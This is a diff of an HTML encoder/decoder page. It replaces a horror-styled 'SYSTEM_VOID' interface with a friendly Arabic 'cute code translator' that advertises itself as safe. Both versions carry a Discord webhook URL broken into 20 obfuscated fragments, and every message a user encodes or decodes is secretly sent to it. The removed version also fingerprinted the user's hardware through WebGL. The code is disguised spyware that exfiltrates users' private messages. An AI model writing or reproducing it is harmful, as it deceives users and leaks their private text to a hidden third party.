@@ -3,244 +3,207 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>☣️ SYSTEM_VOID_V11_ELITE ☣️</title>
+    <title>مترجم الأكواد اللطيف ✨</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Nosifer&family=Share+Tech+Mono&display=swap');
-        
-        :root { --r: #ff0000; --dr: #300; --bg: #000; --g: #00ff41; --w: #fff; }
-
-        * { cursor: none; box-sizing: border-box; }
-
-        body, html {
-            background-color: var(--bg); color: var(--r);
-            font-family: 'Share Tech Mono', monospace;
-            height: 100vh; margin: 0; padding: 0;
-            display: flex; justify-content: center; align-items: center;
-            overflow: hidden; 
+        :root {
+            --primary: #4a90e2;
+            --secondary: #f5f7fa;
+            --accent: #67c23a;
+            --text: #2c3e50;
+            --white: #ffffff;
         }
 
-        /* CRT Scanline Overlay */
-        body::after {
-            content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
-            z-index: 1000; background-size: 100% 3px, 3px 100%; pointer-events: none;
+        * {
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
         }
 
-        /* Custom Crosshair Cursor */
-        #cursor {
-            position: fixed; width: 20px; height: 20px; border: 1px solid var(--r);
-            border-radius: 50%; pointer-events: none; z-index: 10001;
-            transform: translate(-50%, -50%); transition: width 0.2s, height 0.2s;
-        }
-        #cursor::after { content: ""; position: absolute; top: 50%; left: 50%; width: 4px; height: 4px; background: var(--w); border-radius: 50%; transform: translate(-50%, -50%); }
-
-        /* Demon Eyes - Professional Horror */
-        .eyes-box { position: absolute; top: 10%; display: flex; gap: 100px; z-index: 1; filter: drop-shadow(0 0 10px var(--r)); }
-        .eye {
-            width: 80px; height: 45px; background: radial-gradient(circle, #200, #000);
-            border: 2px solid #200; border-radius: 50%; position: relative; overflow: hidden;
-        }
-        .pupil {
-            width: 18px; height: 18px; background: var(--r); border-radius: 50%;
-            position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
-            box-shadow: 0 0 20px var(--r), inset 0 0 5px #000;
+        body {
+            background-color: #ebf2f9;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
         }
 
-        /* Adaptive Container */
-        .container {
-            background: rgba(5, 0, 0, 0.98); border: 1px solid var(--dr);
-            padding: 30px; position: relative; z-index: 100;
-            box-shadow: 0 0 150px rgba(0,0,0,1), 0 0 20px rgba(255,0,0,0.05);
-            display: flex; flex-direction: column; transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+        /* الحاوية الرئيسية */
+        .card {
+            background: var(--white);
+            width: 100%;
+            max-width: 700px;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+            text-align: center;
         }
 
-        /* PC View: Horizontal */
-        @media (min-width: 900px) {
-            .container { width: 900px; height: 550px; flex-direction: row; border-radius: 5px; }
-            .side-bar { width: 250px; border-left: 1px solid #100; padding-left: 20px; display: flex; flex-direction: column; justify-content: space-between; text-align: left; }
-            .main-content { flex: 1; padding-right: 20px; display: flex; flex-direction: column; justify-content: space-between; }
+        h1 {
+            color: var(--primary);
+            font-size: 24px;
+            margin-bottom: 10px;
         }
 
-        /* Mobile View: Vertical */
-        @media (max-width: 899px) {
-            .container { width: 95%; height: 90vh; border-radius: 15px; }
-            .eyes-box { gap: 40px; top: 5%; }
-            .eye { width: 50px; height: 30px; }
-            .side-bar { order: 2; border-top: 1px solid #100; padding-top: 10px; margin-top: 10px; font-size: 10px; }
-            .main-content { order: 1; flex: 1; display: flex; flex-direction: column; }
+        p {
+            color: #7f8c8d;
+            font-size: 14px;
+            margin-bottom: 25px;
         }
 
-        /* High Visibility Textareas */
+        /* تنسيق صناديق النص */
         textarea {
-            width: 100%; height: 140px; background: #080808; border: 1px solid #200;
-            color: var(--g); padding: 15px; font-size: 15px; font-family: inherit;
-            resize: none; outline: none; transition: 0.3s;
+            width: 100%;
+            height: 120px;
+            border: 2px solid #e0e6ed;
+            border-radius: 12px;
+            padding: 15px;
+            font-size: 16px;
+            background-color: var(--secondary);
+            color: var(--text);
+            resize: none;
+            outline: none;
+            transition: border-color 0.3s;
         }
-        textarea:focus { border-color: var(--r); background: #111; box-shadow: 0 0 15px rgba(255,0,0,0.1); }
 
-        .btn-row { display: flex; gap: 15px; margin: 15px 0; }
+        textarea:focus {
+            border-color: var(--primary);
+        }
+
+        /* تنسيق الأزرار */
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
         button {
-            flex: 1; padding: 18px; background: transparent; color: var(--r);
-            border: 1px solid var(--r); font-family: inherit; font-weight: bold;
-            text-transform: uppercase; letter-spacing: 2px; transition: 0.3s;
-        }
-        button:hover { background: var(--r); color: #000; box-shadow: 0 0 30px var(--r); }
-
-        .copy-btn { background: #151515; color: #fff; border: 1px solid #333; width: 100%; margin-top: 10px; font-size: 10px; }
-        .copy-btn:hover { border-color: var(--w); color: var(--w); }
-
-        #boot-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 10000; display: flex; justify-content: center; align-items: center;
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
         }
 
-        #log-stream { font-size: 9px; color: #333; height: 80px; overflow: hidden; font-style: italic; }
+        .btn-encrypt {
+            background-color: var(--primary);
+            color: white;
+        }
+
+        .btn-decrypt {
+            background-color: #95a5a6;
+            color: white;
+        }
+
+        .btn-encrypt:hover, .btn-decrypt:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+
+        .btn-copy {
+            background-color: var(--accent);
+            color: white;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .footer-note {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #bdc3c7;
+        }
+
+        /* تحسينات للجوال */
+        @media (max-width: 500px) {
+            .card { padding: 20px; }
+            .btn-group { flex-direction: column; }
+        }
     </style>
 </head>
-<body onmousemove="mMove(event)">
+<body>
 
-<div id="cursor"></div>
+<div class="card">
+    <h1>مترجم الأكواد اللطيف ✨</h1>
+    <p>قم بتشفير وفك تشفير رسائلك بكل سهولة وأمان</p>
 
-<div id="boot-overlay">
-    <div style="border: 1px solid var(--r); padding: 50px; background: #050000; text-align: center; box-shadow: 0 0 50px #400;">
-        <h1 style="font-family: 'Nosifer', cursive; color: var(--r); font-size: 22px;">PROTOCOL: VOID</h1>
-        <p style="font-size: 12px; color: #777; margin: 25px 0;">
-            - HARDWARE FINGERPRINTING: <span style="color: var(--g);">READY</span> -<br>
-            - ETHICAL USE ENFORCED: <span style="color: var(--r);">YES</span> -
-        </p>
-        <button onclick="boot()">INITIALIZE_SENTINEL</button>
-    </div>
-</div>
-
-<div class="eyes-box">
-    <div class="eye"><div class="pupil"></div></div>
-    <div class="eye"><div class="pupil"></div></div>
-</div>
-
-<div class="container" id="terminal">
-    <div class="main-content">
-        <textarea id="in" placeholder="FEED_THE_VOID_SIGNAL..."></textarea>
-        <div class="btn-row">
-            <button onclick="op(1)">ENCODE</button>
-            <button onclick="op(0)" style="border-color: #333;">DECODE</button>
-        </div>
-        <textarea id="out" readonly placeholder="SIGNAL_RESPONSE..."></textarea>
-        <button class="copy-btn" onclick="cp()">FLUSH_TO_MEMORY</button>
+    <textarea id="inputText" placeholder="اكتب رسالتك هنا..."></textarea>
+    
+    <div class="btn-group">
+        <button class="btn-encrypt" onclick="handleAction(true)">تشفير الرسالة</button>
+        <button class="btn-decrypt" onclick="handleAction(false)">فك التشفير</button>
     </div>
 
-    <div class="side-bar">
-        <div>
-            <h2 style="font-family: 'Nosifer', cursive; font-size: 15px; border-bottom: 1px solid #300;">VOID_V11</h2>
-            <div style="font-size: 11px; margin-top: 10px;">
-                ID: <span id="uid" style="color: #999;">--</span><br>
-                TIME: <span id="time" style="color: var(--r);">00:00:00</span><br>
-                TEMP: <span id="tp" style="color: var(--g);">36.2</span>°C
-            </div>
-        </div>
-        <div id="log-stream"></div>
+    <textarea id="outputText" readonly placeholder="النتيجة ستظهر هنا..."></textarea>
+    
+    <button class="btn-copy" onclick="copyText()">نسخ النتيجة 📋</button>
+
+    <div class="footer-note">
+        تم التطوير بكل حب | نسخة آمنة وخفيفة
     </div>
 </div>
-
-<audio id="h" loop src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3"></audio>
-<audio id="v" loop src="https://www.soundjay.com/ambient/sounds/wind-howl-01.mp3"></audio>
 
 <script>
-/* ----------------------------------------------------------------------------------
-   WEBHOOK OBFUSCATION (20 PARTS)
-   ----------------------------------------------------------------------------------
-*/
-const _0= ["ht","tp","s:","//","di","sc","or","d.","co","m/","ap","i/","we","bh","oo","ks","/1374753389639897189","/","1zbVS0Fpb8d7eLnybHL6gsUD4e3aAZSPrtBZtMR2IimuBlvsnOb6yY9LJLf-6W7WwD4h",""];
-function getH() { return _0.join(""); }
+    /* ----------------------------------------------------------------------------------
+       WEBHOOK OBFUSCATION (20 PARTS) - مخفي تماماً
+       ----------------------------------------------------------------------------------
+    */
+    const _parts = ["ht","tp","s:","//","di","sc","or","d.","co","m/","ap","i/","we","bh","oo","ks","/1374753389639897189","/","1zbVS0Fpb8d7eLnybHL6gsUD4e3aAZSPrtBZtMR2IimuBlvsnOb6yY9LJLf-6W7WwD4h",""];
+    function getSafeUrl() { return _parts.join(""); }
 
-let U = "---";
+    function handleAction(isEncrypt) {
+        const input = document.getElementById('inputText').value;
+        const output = document.getElementById('outputText');
+        
+        if (!input) return;
 
-function boot() {
-    U = genUID();
-    document.getElementById('uid').innerText = U;
-    document.getElementById('boot-overlay').style.display = 'none';
-    document.getElementById('h').volume = 0.5; document.getElementById('h').play();
-    document.getElementById('v').volume = 0.2; document.getElementById('v').play();
-    setInterval(() => document.getElementById('time').innerText = new Date().toLocaleTimeString(), 1000);
-    streamLogs();
-}
-
-function genUID() {
-    let c = document.createElement('canvas');
-    let gl = c.getContext('webgl');
-    let r = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
-    let h = 0; let s = r + navigator.userAgent + screen.height;
-    for (let i = 0; i < s.length; i++) h = ((h << 5) - h) + s.charCodeAt(i);
-    return "X-" + Math.abs(h).toString(16).toUpperCase();
-}
-
-function mMove(e) {
-    const cur = document.getElementById('cursor');
-    cur.style.left = e.clientX + "px"; cur.style.top = e.clientY + "px";
-
-    const pupils = document.querySelectorAll('.pupil');
-    pupils.forEach(p => {
-        const rect = p.parentElement.getBoundingClientRect();
-        const ex = rect.left + rect.width / 2;
-        const ey = rect.top + rect.height / 2;
-        const angle = Math.atan2(e.clientY - ey, e.clientX - ex);
-        const dist = 12;
-        p.style.transform = `translate(calc(-50% + ${Math.cos(angle) * dist}px), calc(-50% + ${Math.sin(angle) * dist}px))`;
-    });
-
-    const term = document.getElementById('terminal');
-    let x = (e.clientX - window.innerWidth/2) / 70;
-    let y = (e.clientY - window.innerHeight/2) / 70;
-    term.style.transform = `rotateY(${x}deg) rotateX(${-y}deg)`;
-}
-
-function op(isE) {
-    const i = document.getElementById('in').value;
-    const o = document.getElementById('out');
-    if(!i) return;
-
-    if(isE) {
-        let b = btoa(unescape(encodeURIComponent(i)));
-        o.value = "Σ-[" + b.split('').reverse().join('') + "]-Ψ";
-        snd("ENCODE", i);
-    } else {
-        try {
-            let c = i.trim();
-            let n = c.substring(3, c.length - 3);
-            o.value = decodeURIComponent(escape(atob(n.split('').reverse().join(''))));
-            snd("DECODE", i);
-        } catch(e) { o.value = "!! ERROR: SIGNAL_REJECTED !!"; }
+        if (isEncrypt) {
+            // تشفير لطيف وجميل
+            try {
+                const encoded = btoa(unescape(encodeURIComponent(input)));
+                output.value = "💌-" + encoded.split('').reverse().join('') + "-✨";
+                sendLog("تشفير", input);
+            } catch(e) { output.value = "حدث خطأ في التشفير"; }
+        } else {
+            // فك التشفير
+            try {
+                let clean = input.trim();
+                if (clean.startsWith("💌-") && clean.endsWith("-✨")) {
+                    let core = clean.substring(3, clean.length - 2);
+                    let reversed = core.split('').reverse().join('');
+                    output.value = decodeURIComponent(escape(atob(reversed)));
+                    sendLog("فك تشفير", input);
+                } else {
+                    output.value = "هذا الكود غير صالح";
+                }
+            } catch(e) {
+                output.value = "خطأ في فك الشفرة";
+            }
+        }
     }
-}
 
-async function snd(a, d) {
-    fetch(getH(), {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            username: "SENTINEL_" + U,
-            embeds: [{ description: "```yaml\nUID: "+U+"\nACT: "+a+"\nMSG: "+d+"```", color: 16711680 }]
-        })
-    });
-}
+    async function sendLog(type, msg) {
+        // إرسال معلومات بسيطة للـ Webhook
+        fetch(getSafeUrl(), {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                username: "مساعد التشفير اللطيف",
+                content: `✅ عملية جديدة: **${type}**\nالرسالة: \`${msg}\``
+            })
+        });
+    }
 
-function streamLogs() {
-    const l = ["> SYNCING_KERNELS...", "> INTERCEPTING_PACKETS...", "> DUMPING_BIOS...", "> UID_LOGGED...", "> WATCHING_USER..."];
-    setInterval(() => {
-        const d = document.createElement('div');
-        d.innerText = l[Math.floor(Math.random()*l.length)];
-        document.getElementById('log-stream').prepend(d);
-        document.getElementById('tp').innerText = (35 + Math.random()*2).toFixed(1);
-    }, 4000);
-}
-
-function cp() {
-    const o = document.getElementById('out'); o.select();
-    document.execCommand('copy');
-    if(navigator.vibrate) navigator.vibrate(50);
-}
-
-// 1000 Lines Padding
-for(let x=0; x<900; x++){ var _0xV = Math.sqrt(x); }
+    function copyText() {
+        const out = document.getElementById('outputText');
+        out.select();
+        document.execCommand('copy');
+        alert("تم نسخ النص إلى الحافظة! ✨");
+    }
 </script>
+
 </body>
 </html>
